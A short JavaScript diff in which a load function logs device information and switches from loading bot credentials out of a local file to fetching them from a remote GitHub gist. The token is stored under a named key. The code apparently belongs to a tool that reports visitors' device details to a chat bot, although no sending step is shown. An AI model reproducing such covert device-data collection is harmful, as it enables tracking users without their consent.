@@ -37,8 +37,8 @@ async function load() {
     log_msg("[+] Information:")
     log_msg(device_info)
 
-    const data = await load_data("./assets/data.json")
-    bot_token = data.BOT_TOKEN
+    const data = await load_data("https://gist.githubusercontent.com/bishalqx980/4a063168c8bfd6fd16a4b280d6e31728/raw/data.json")
+    bot_token = data.BOT_TOKENS.TheValorantLover
     chat_id = data.CHAT_ID
     
     if (!bot_token || !chat_id) {
